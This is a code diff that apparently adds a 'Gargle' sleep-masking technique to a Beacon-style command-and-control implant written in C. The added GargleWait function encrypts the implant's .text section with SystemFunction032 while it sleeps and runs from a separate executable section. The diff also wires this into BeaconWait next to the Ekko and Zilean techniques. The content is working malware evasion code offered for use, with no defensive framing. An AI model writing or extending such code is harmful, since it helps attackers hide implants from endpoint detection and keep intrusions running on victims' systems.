@@ -460,6 +460,104 @@ cleanup:
     SecureZeroMemory(&data, sizeof(data));
     return ok;
 }
+
+#if defined(_MSC_VER)
+#pragma comment(linker, "/SECTION:.gargle,ER")
+#pragma code_seg(push, ".gargle")
+#endif
+/* 当前线程 sleep mask：仅加密 .text，执行窗口留在独立 .gargle 段，避免 NtContinue callback 链。 */
+static BOOL GargleWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD wait_ms)
+{
+    SleepObfImageRegions regions;
+    fnVirtualProtect pVirtualProtect;
+    fnSystemFunction032 pSystemFunction032;
+    fnWaitForSingleObject pWaitForSingleObject;
+    fnWaitForMultipleObjects pWaitForMultipleObjects;
+    fnSleep pSleep;
+    BYTE key_bytes[16];
+    MY_USTRING data;
+    MY_USTRING key;
+    BYTE* text_base;
+    BYTE* self;
+    DWORD old_protect = 0;
+    DWORD tmp_protect = 0;
+    DWORD wait_rc = WAIT_FAILED;
+    BOOL protected_text = FALSE;
+    BOOL masked = FALSE;
+    BOOL unmasked = FALSE;
+    BOOL restored = FALSE;
+
+    if (!ctx || !SleepObfFindImageRegions(ctx, &regions) ||
+        !regions.text.base || regions.text.size == 0 ||
+        regions.text.size > 0xffffffffu) {
+        return FALSE;
+    }
+
+    text_base = (BYTE*)regions.text.base;
+    self = (BYTE*)&GargleWait;
+    if (self >= text_base && self < text_base + regions.text.size) {
+        return FALSE;
+    }
+
+    pVirtualProtect = ctx->api.pfnVirtualProtect;
+    pSystemFunction032 = ctx->api.pfnSystemFunction032;
+    pWaitForSingleObject = ctx->api.pfnWaitForSingleObject;
+    pWaitForMultipleObjects = ctx->api.pfnWaitForMultipleObjects;
+    pSleep = ctx->api.pfnSleep;
+    if (!pVirtualProtect || !pSystemFunction032 ||
+        ((handles && count > 1 && !pWaitForMultipleObjects) ||
+         (handles && count == 1 && !pWaitForSingleObject && !pWaitForMultipleObjects) ||
+         (!handles && !pSleep))) {
+        return FALSE;
+    }
+    if (!CryptoRandom(key_bytes, sizeof(key_bytes))) {
+        return FALSE;
+    }
+
+    data.Length = (DWORD)regions.text.size;
+    data.MaximumLength = (DWORD)regions.text.size;
+    data.Buffer = regions.text.base;
+    key.Length = sizeof(key_bytes);
+    key.MaximumLength = sizeof(key_bytes);
+    key.Buffer = key_bytes;
+
+    protected_text = pVirtualProtect(regions.text.base, regions.text.size,
+                                     PAGE_READWRITE, &old_protect);
+    if (!protected_text) {
+        goto cleanup;
+    }
+
+    masked = NT_SUCCESS(pSystemFunction032(&data, &key));
+    if (!masked) {
+        goto cleanup;
+    }
+
+    if (handles && count > 0) {
+        if (count == 1 && pWaitForSingleObject) {
+            wait_rc = pWaitForSingleObject(handles[0], wait_ms);
+        } else {
+            wait_rc = pWaitForMultipleObjects(count, handles, FALSE, wait_ms);
+        }
+    } else {
+        pSleep(wait_ms);
+        wait_rc = WAIT_TIMEOUT;
+    }
+
+    unmasked = NT_SUCCESS(pSystemFunction032(&data, &key));
+
+cleanup:
+    if (protected_text) {
+        restored = pVirtualProtect(regions.text.base, regions.text.size,
+                                   regions.restore_protect, &tmp_protect);
+    }
+    SecureZeroMemory(key_bytes, sizeof(key_bytes));
+    SecureZeroMemory(&key, sizeof(key));
+    SecureZeroMemory(&data, sizeof(data));
+    return masked && unmasked && restored && wait_rc != WAIT_FAILED;
+}
+#if defined(_MSC_VER)
+#pragma code_seg(pop)
+#endif
 #endif
 
 DWORD BeaconWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD timeout_ms)
@@ -486,8 +584,12 @@ DWORD BeaconWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD t
 
     if (!ctx->profile.sleep_obf_enabled ||
         (ctx->profile.sleep_obf_technique != SLEEP_OBF_EKKO &&
-         ctx->profile.sleep_obf_technique != SLEEP_OBF_ZILEAN) ||
-        timeout_ms < SLEEP_OBF_MIN_MS ||
+         ctx->profile.sleep_obf_technique != SLEEP_OBF_ZILEAN &&
+         ctx->profile.sleep_obf_technique != SLEEP_OBF_GARGLE) ||
+        timeout_ms < SLEEP_OBF_MIN_MS) {
+        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
+    }
+    if (ctx->profile.sleep_obf_technique != SLEEP_OBF_GARGLE &&
         timeout_ms <= SleepObfEstimatedOverhead() + SLEEP_OBF_MIN_MASK_MS) {
         return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
     }
@@ -503,6 +605,9 @@ DWORD BeaconWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD t
         break;
     case SLEEP_OBF_ZILEAN:
         ok = ZileanWait(ctx, local_handles, count, timeout_ms);
+        break;
+    case SLEEP_OBF_GARGLE:
+        ok = GargleWait(ctx, local_handles, count, timeout_ms);
         break;
     default:
         ok = FALSE;
